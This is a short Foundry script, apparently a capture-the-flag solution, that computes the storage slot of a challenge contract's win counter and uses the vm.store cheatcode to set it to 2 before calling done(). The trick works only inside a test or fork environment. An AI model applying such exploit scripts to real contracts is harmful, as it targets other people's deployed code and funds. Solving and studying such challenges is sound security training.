// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Script.sol";

interface IChallenge {
    function done() external view returns (uint16[] memory);
}

contract Exploit is Script {
    function run() public {
        address target = 0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59;

        bytes32 slot = bytes32(uint256(1));
        bytes32 consecutiveWinsSlot = keccak256(
            bytes.concat(bytes32(uint256(uint160(address(this)))), slot)
        );
        vm.store(target, consecutiveWinsSlot, bytes32(uint256(2)));
        IChallenge(target).done();
    }
}
